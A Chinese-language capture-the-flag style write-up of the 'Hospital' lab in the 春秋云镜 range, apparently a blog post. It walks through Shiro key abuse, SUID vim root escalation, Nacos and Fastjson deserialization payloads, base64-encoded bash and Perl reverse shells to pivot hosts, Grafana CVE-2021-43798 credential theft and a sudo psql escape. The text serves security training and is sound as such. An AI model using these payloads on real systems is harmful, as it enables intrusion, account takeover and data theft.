@@ -1,0 +1,528 @@
+---
+title: '春秋云镜-Hospital' # (Required, max 60)
+description: '你将扮演一名渗透测试工程师，被派遣去测试某家医院的网络安全性。你的目标是成功获取所有服务器的权限，以评估公司的网络安全状况。该靶场共有 4 个flag，分布于不同的靶机。' # (Required, 10 to 160)
+publishDate: '2025-4-18' # (Required, Date)
+tags:
+  - 春秋云镜 # (Also can write format like next line)
+heroImage: { src: 'https://image777.oss-cn-beijing.aliyuncs.com/img/202510052157366.jpg', inferSize: true, color: '#4fb248ff' }
+draft: false # (set true will only show in development)
+language: '简中' # (String as you like)
+comment: true # (set false will disable comment, even if you've enabled it in site-config)
+---
+## 外网
+
+### 信息收集
+
+```shell
+❯ ./fscan -h 39.99.227.240                                         
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-04-17 23:18:43] [INFO] 暴力破解线程数: 1
+[2025-04-17 23:18:43] [INFO] 开始信息扫描
+[2025-04-17 23:18:43] [INFO] 最终有效主机数量: 1
+[2025-04-17 23:18:43] [INFO] 开始主机扫描
+[2025-04-17 23:18:43] [INFO] 有效端口数量: 233
+[2025-04-17 23:18:43] [SUCCESS] 端口开放 39.99.227.240:22
+[2025-04-17 23:18:43] [SUCCESS] 服务识别 39.99.227.240:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]
+[2025-04-17 23:18:43] [SUCCESS] 端口开放 39.99.227.240:8080
+[2025-04-17 23:18:49] [SUCCESS] 服务识别 39.99.227.240:8080 => [http]
+[2025-04-17 23:18:49] [INFO] 存活端口数量: 2
+[2025-04-17 23:18:49] [INFO] 开始漏洞扫描
+[2025-04-17 23:18:49] [INFO] 加载的插件: ssh, webpoc, webtitle
+[2025-04-17 23:18:49] [SUCCESS] 网站标题 http://39.99.227.240:8080 状态码:302 长度:0      标题:无标题 重定向地址: http://39.99.227.240:8080/login;jsessionid=A315BAAC49DBECD9223E0BD9C6FB94DB
+[2025-04-17 23:18:50] [SUCCESS] 网站标题 http://39.99.227.240:8080/login;jsessionid=A315BAAC49DBECD9223E0BD9C6FB94DB 状态码:200 长度:2005   标题:医疗管理后台
+[2025-04-17 23:18:52] [SUCCESS] 目标: http://39.99.227.240:8080
+  漏洞类型: poc-yaml-spring-actuator-heapdump-file
+  漏洞名称:
+  详细信息:
+	author:AgeloVito
+	links:https://www.cnblogs.com/wyb628/p/8567610.html
+[2025-04-17 23:18:57] [SUCCESS] 扫描已完成: 3/3
+```
+
+扫到8080端口的网站和dump泄漏，dirsearch扫目录发现`/actuator/heapdump`
+
+```shell
+python3 dirsearch.py -u http://39.99.227.240:8080
+```
+
+### Shiro反序列化
+
+利用JDump工具分析拿到key，猜测是Shiro
+
+```shell
+java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump > 1.txt
+```
+
+```shell
+key = GAYysgMQhG7/CzIJlVpR2g==
+```
+
+抓包果然发现特征，经典组合拳
+
+![image-20250417233909381](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354107.png)
+
+直接用工具一把梭，注入内存马
+
+![image-20250417234142257](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354072.png)
+
+这里尝试PHP马连不上，Jsp马可以
+
+![image-20250417234238093](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354820.png)
+
+蚁剑连接
+
+![image-20250417235102881](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354170.png)
+
+### SUID提权
+
+```shell
+/usr/bin/vim.basic
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/staprun
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/stapbpf
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/mount
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+```
+
+参考[gtfobins](https://gtfobins.github.io/#)，可以利用`vim.basic`写公钥（或写passwd，sudoer）
+
+故先升级交互式shell
+
+```shell
+python3 -c "import pty;pty.spawn('/bin/bash')"
+script /dev/null -c bash
+ctrl+z
+stty raw -echo; fg
+reset
+xterm-256color
+```
+
+```shell
+vim.basic /etc/passwd
+:wq!
+```
+
+写`/etc/passwd`
+
+```shell
+openssl passwd -1 -salt 123 123456
+hacker:$1$123$7mft0jKnzzvAdU4t0unTG1:0:0:/root:/bin/bash
+```
+
+### flag1
+
+ssh连接，拿下web1主机
+
+```shell
+ssh hacker@39.99.227.240
+```
+
+![image-20250418000306099](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354923.png)
+
+## 一层内网
+
+### 信息收集
+
+老规矩先上fscan收集信息
+
+```shell
+root@web01:/home/app# ./fscan_linux -h 172.30.12.5/24
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-04-18 00:07:09] [INFO] 暴力破解线程数: 1
+[2025-04-18 00:07:09] [INFO] 开始信息扫描
+[2025-04-18 00:07:10] [INFO] CIDR范围: 172.30.12.0-172.30.12.255
+[2025-04-18 00:07:10] [INFO] 生成IP范围: 172.30.12.0.%!d(string=172.30.12.255) - %!s(MISSING).%!d(MISSING)
+[2025-04-18 00:07:10] [INFO] 解析CIDR 172.30.12.5/24 -> IP范围 172.30.12.0-172.30.12.255
+[2025-04-18 00:07:10] [INFO] 最终有效主机数量: 256
+[2025-04-18 00:07:10] [INFO] 开始主机扫描
+[2025-04-18 00:07:10] [SUCCESS] 目标 172.30.12.5     存活 (ICMP)
+[2025-04-18 00:07:10] [SUCCESS] 目标 172.30.12.6     存活 (ICMP)
+[2025-04-18 00:07:10] [SUCCESS] 目标 172.30.12.236   存活 (ICMP)
+[2025-04-18 00:07:13] [INFO] 存活主机数量: 3
+[2025-04-18 00:07:13] [INFO] 有效端口数量: 233
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.6:445
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.6:139
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.6:135
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.236:22
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.5:22
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.236:8009
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.5:8080
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.236:8080
+[2025-04-18 00:07:13] [SUCCESS] 端口开放 172.30.12.6:8848
+[2025-04-18 00:07:13] [SUCCESS] 服务识别 172.30.12.236:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]
+[2025-04-18 00:07:13] [SUCCESS] 服务识别 172.30.12.5:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]
+[2025-04-18 00:07:18] [SUCCESS] 服务识别 172.30.12.6:445 => 
+[2025-04-18 00:07:18] [SUCCESS] 服务识别 172.30.12.6:139 =>  Banner:[.]
+[2025-04-18 00:07:18] [SUCCESS] 服务识别 172.30.12.236:8009 => 
+[2025-04-18 00:07:18] [SUCCESS] 服务识别 172.30.12.5:8080 => [http]
+[2025-04-18 00:07:19] [SUCCESS] 服务识别 172.30.12.236:8080 => [http]
+[2025-04-18 00:07:24] [SUCCESS] 服务识别 172.30.12.6:8848 => [http]
+[2025-04-18 00:08:18] [SUCCESS] 服务识别 172.30.12.6:135 => 
+[2025-04-18 00:08:18] [INFO] 存活端口数量: 9
+[2025-04-18 00:08:18] [INFO] 开始漏洞扫描
+[2025-04-18 00:08:18] [INFO] 加载的插件: findnet, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
+[2025-04-18 00:08:18] [SUCCESS] NetInfo 扫描结果
+目标主机: 172.30.12.6
+主机名: Server02
+发现的网络接口:
+   IPv4地址:
+      └─ 172.30.12.6
+[2025-04-18 00:08:18] [SUCCESS] NetBios 172.30.12.6     WORKGROUP\SERVER02            
+[2025-04-18 00:08:18] [SUCCESS] 网站标题 http://172.30.12.5:8080   状态码:302 长度:0      标题:无标题 重定向地址: http://172.30.12.5:8080/login;jsessionid=1ACFB6A4E51D284ABDFA37E0E80326B9
+[2025-04-18 00:08:18] [SUCCESS] 网站标题 http://172.30.12.236:8080 状态码:200 长度:3964   标题:医院后台管理平台
+[2025-04-18 00:08:18] [SUCCESS] 网站标题 http://172.30.12.5:8080/login;jsessionid=1ACFB6A4E51D284ABDFA37E0E80326B9 状态码:200 长度:2005   标题:医疗管理后台
+[2025-04-18 00:08:19] [SUCCESS] 网站标题 http://172.30.12.6:8848   状态码:404 长度:431    标题:HTTP Status 404 – Not Found
+[2025-04-18 00:08:20] [SUCCESS] 目标: http://172.30.12.5:8080
+  漏洞类型: poc-yaml-spring-actuator-heapdump-file
+  漏洞名称: 
+  详细信息:
+        author:AgeloVito
+        links:https://www.cnblogs.com/wyb628/p/8567610.html
+[2025-04-18 00:08:20] [SUCCESS] 目标: http://172.30.12.6:8848
+  漏洞类型: poc-yaml-alibaba-nacos
+  漏洞名称: 
+  详细信息:
+        author:AgeloVito
+        links:https://blog.csdn.net/caiqiiqi/article/details/112005424
+[2025-04-18 00:08:21] [SUCCESS] 目标: http://172.30.12.6:8848
+  漏洞类型: poc-yaml-alibaba-nacos-v1-auth-bypass
+  漏洞名称: 
+  详细信息:
+        author:kmahyyg(https://github.com/kmahyyg)
+        links:https://github.com/alibaba/nacos/issues/4593
+```
+
+扫到两台资产
+
+`172.30.12.6`:8848端口开启Nacos服务，yaml反序列化漏洞
+
+`172.30.12.236`:8080端口有web服务，按题目提示猜测为fastjson
+
+### 一级代理
+
+```shell
+./agent_linux_x64 -lport 8888
+```
+
+```shell
+❯ ./admin_macos_x64 -rhost 39.99.227.240 -rport 8888               ─
+Venom Admin Node Start...
+
+  ____   ____  { v1.1  author: Dlive }
+  \   \ /   /____   ____   ____   _____
+   \   Y   // __ \ /    \ /    \ /     \
+    \     /\  ___/|   |  (  <_> )  Y Y  \
+     \___/  \___  >___|  /\____/|__|_|  /
+                \/     \/             \/
+
+(admin node) >>> show
+A
++ -- 1
+(admin node) >>> goto 1
+node 1
+(node 1) >>> socks 9999
+a socks5 proxy of the target node has started up on the local port 9999.
+```
+
+![image-20250418001630623](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354790.png)
+
+### 172.30.12.6 - flag2
+
+弱密码`nacos:nacos`进入后台读取Nacos配置
+
+```yaml
+server:
+  port: 8080
+  servlet:
+    context-path: /hello
+
+spring:
+  application:
+    name: db-config
+  cloud:
+    nacos:
+      discovery:
+        server-addr: 127.0.0.1:8848
+      config:
+        server-addr: 127.0.0.1:8848
+        file-extension: yaml
+        namespace: dev
+        group: DEFAULT_GROUP
+        data-id: db-config.yaml
+  datasource:
+    mysql:
+      url: jdbc:mysql://localhost:3306/test?useSSL=false&serverTimezone=UTC&allowPublicKeyRetrieval=true
+      username: root
+      password: P@ssWord!!!
+  redis:
+    host: localhost
+    port: 6379
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include: '*'
+
+```
+
+利用Nacos利用工具检测发现yaml反序列化漏洞
+
+![image-20250418002210418](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181354020.png)
+
+因为是Win主机修改payload为添加新管理员用户
+
+```java
+public AwesomeScriptEngineFactory() {
+        try {
+                Runtime.getRuntime().exec("net user baoyf passwd1234 /add");
+                Runtime.getRuntime().exec("net localgroup administrators baoyf /add");
+        } catch (IOException e) {
+                e.printStackTrace();
+        }
+}
+```
+
+编译，打包
+
+![image-20250418002705724](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355173.png)
+
+> 要使用java1.8编译，卡了好久
+
+主机不出网，将恶意jar包传到web1主机，开启web服务，让靶机访问
+
+```shell
+python3 -m http.server 1234
+```
+
+![image-20250418003331516](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355990.png)
+
+![image-20250418003419034](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355256.png)
+
+收到请求，证实漏洞存在，RDP上去，在管理员目录下找到flag2
+
+![image-20250418005240801](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355221.png)
+
+### 172.30.12.236 - flag3
+
+再看下另一台，用Yakit插件扫到RCE漏洞
+
+![image-20250418010142874](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355873.png)
+
+接下来就是复现，在Web1开启JNDI，不出网所以将shell反弹到Web1
+
+```shell
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMzAuMTIuNS81MDAwIDA+JjE=}|{base64, -d} | {bash,-i]" -A "172.30.12.5"
+```
+
+
+
+![image-20250418011402494](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355887.png)
+
+```json
+{
+	"name": {
+		"@type": "java.lang.Class",
+		"val": "com.sun.rowset.JdbcRowSetImpl"
+	},
+	"x": {
+		"@type": "com.sun.rowset.JdbcRowSetImpl",
+		"dataSourceName": "rmi://172.30.12.5:1099/qt6t66",
+		"autoCommit": true
+	}
+}
+```
+
+```shell
+nc -lvnp 5000
+```
+
+
+
+拿下Web3主机
+
+![image-20250418011315587](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355254.png)
+
+## 二层内网
+
+### 信息收集
+
+修改Web3 root密码便于下一步利用
+
+没有机器了，但还差一个flag，`ip a`发现双网卡，传fscan进一步扫描内网
+
+```shell
+passwd
+ssh root@172.30.12.236
+wget http://172.30.12.5:1234/fscan_linux
+wget http://172.30.12.5:1234/agent_linux_x64
+```
+
+```shell
+root@web03:~# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:28:b3:f3 brd ff:ff:ff:ff:ff:ff
+    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0
+       valid_lft 315352567sec preferred_lft 315352567sec
+    inet6 fe80::216:3eff:fe28:b3f3/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:16:3e:28:b3:cb brd ff:ff:ff:ff:ff:ff
+    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe28:b3cb/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+扫`172.30.54.179/24`网段
+
+```shell
+root@web03:~# ./fscan_linux -h 172.30.54.179/24
+┌──────────────────────────────────────────────┐
+│    ___                              _        │
+│   / _ \     ___  ___ _ __ __ _  ___| | __    │
+│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
+│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
+│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
+└──────────────────────────────────────────────┘
+      Fscan Version: 2.0.0
+
+[2025-04-18 01:22:38] [INFO] 暴力破解线程数: 1
+[2025-04-18 01:22:38] [INFO] 开始信息扫描
+[2025-04-18 01:22:38] [INFO] CIDR范围: 172.30.54.0-172.30.54.255
+[2025-04-18 01:22:39] [INFO] 生成IP范围: 172.30.54.0.%!d(string=172.30.54.255) - %!s(MISSING).%!d(MISSING)
+[2025-04-18 01:22:39] [INFO] 解析CIDR 172.30.54.179/24 -> IP范围 172.30.54.0-172.30.54.255
+[2025-04-18 01:22:39] [INFO] 最终有效主机数量: 256
+[2025-04-18 01:22:39] [INFO] 开始主机扫描
+[2025-04-18 01:22:39] [SUCCESS] 目标 172.30.54.179   存活 (ICMP)
+[2025-04-18 01:22:39] [SUCCESS] 目标 172.30.54.12    存活 (ICMP)
+[2025-04-18 01:22:42] [INFO] 存活主机数量: 2
+[2025-04-18 01:22:42] [INFO] 有效端口数量: 233
+[2025-04-18 01:22:42] [SUCCESS] 端口开放 172.30.54.179:22
+[2025-04-18 01:22:42] [SUCCESS] 端口开放 172.30.54.12:22
+[2025-04-18 01:22:42] [SUCCESS] 端口开放 172.30.54.12:5432
+[2025-04-18 01:22:42] [SUCCESS] 端口开放 172.30.54.12:3000
+[2025-04-18 01:22:42] [SUCCESS] 端口开放 172.30.54.179:8009
+[2025-04-18 01:22:42] [SUCCESS] 端口开放 172.30.54.179:8080
+[2025-04-18 01:22:42] [SUCCESS] 服务识别 172.30.54.179:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]
+[2025-04-18 01:22:42] [SUCCESS] 服务识别 172.30.54.12:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.9 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9.]
+[2025-04-18 01:22:47] [SUCCESS] 服务识别 172.30.54.12:5432 => 
+[2025-04-18 01:22:47] [SUCCESS] 服务识别 172.30.54.12:3000 => [http] Banner:[HTTP/1.1 400 Bad Request.Content-Type: text/plain; charset=utf-8.Connection: close.400 Bad Request]
+[2025-04-18 01:22:47] [SUCCESS] 服务识别 172.30.54.179:8009 => 
+[2025-04-18 01:22:47] [SUCCESS] 服务识别 172.30.54.179:8080 => [http]
+[2025-04-18 01:22:47] [INFO] 存活端口数量: 6
+[2025-04-18 01:22:47] [INFO] 开始漏洞扫描
+[2025-04-18 01:22:48] [INFO] 加载的插件: postgres, ssh, webpoc, webtitle
+[2025-04-18 01:22:48] [SUCCESS] 网站标题 http://172.30.54.179:8080 状态码:200 长度:3964   标题:医院后台管理平台
+[2025-04-18 01:22:48] [SUCCESS] 网站标题 http://172.30.54.12:3000  状态码:302 长度:29     标题:无标题 重定向地址: http://172.30.54.12:3000/login
+[2025-04-18 01:22:48] [SUCCESS] 网站标题 http://172.30.54.12:3000/login 状态码:200 长度:27909  标题:Grafana
+```
+
+发现资产`172.30.54.12`
+开启服务Grafana(3000端口)+PostgreSQL(5431端口)
+
+### 二级代理
+
+```shell
+(node 1) >>> show
+A
++ -- 1
+(node 1) >>> listen 9998
+listen 9998
+the port 9998 is successfully listening on the remote node!
+(node 1) >>> show
+A
++ -- 1
+     + -- 2
+(node 1) >>> goto 2
+node 2
+(node 2) >>> socks 9998
+a socks5 proxy of the target node has started up on the local port 9998.
+```
+
+```shell
+root@web03:~# ./agent_linux_x64 -rhost 172.30.12.5 -rport 9998
+2025/04/18 01:27:05 [+]Successfully connects to a new node
+```
+
+![image-20250418013000265](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355971.png)
+
+### 172.30.54.12 - flag4
+
+Grafana存在CVE-2021-43798，利用[GrafanaExp](https://github.com/A-D-Team/grafanaExp)，拿到数据库密码
+
+```shell
+./grafanaExp_linux_amd64 exp -u http://172.30.54.12:3000
+type:[postgres]	name:[PostgreSQL]		url:[localhost:5432]	user:[postgres]	password[Postgres@123]
+```
+
+搭建了代理，在本地连接SQL
+可以修改root用户密码，psql也可以创建函数执行命令，缺点是没回显
+
+不出网向Web3反弹shell，bash无法使用，可以用perl
+
+```shell
+psql -h 172.30.54.12 -U postgres -W
+# 反弹shell
+select system('perl -e \'use Socket;$i="172.30.54.179";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
+# 修改数据库admin密码
+ALTER USER root WITH PASSWORD '123456';
+```
+
+sudo提权
+
+```shell
+postgres@web04:/usr/local/pgsql/data$ sudo -l
+Matching Defaults entries for postgres on web04:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User postgres may run the following commands on web04:
+    (ALL) NOPASSWD: /usr/local/postgresql/bin/psql
+```
+
+```shell
+sudo /usr/local/postgresql/bin/psql
+\?
+!/bin/bash
+```
+
+![image-20250418015134627](https://image777.oss-cn-beijing.aliyuncs.com/img/202504181355805.png)
+
+## 参考
+
+[Fastjson 1.2.24 反序列化导致任意命令执行漏洞](https://www.cnblogs.com/Junglezt/p/18137413)
+
+[春秋云镜仿真靶场Hospital实操](https://lca.xlog.app/chun-qiu-yun-jing-fang-zhen-ba-chang-Hospital-shi-cao?locale=zh)
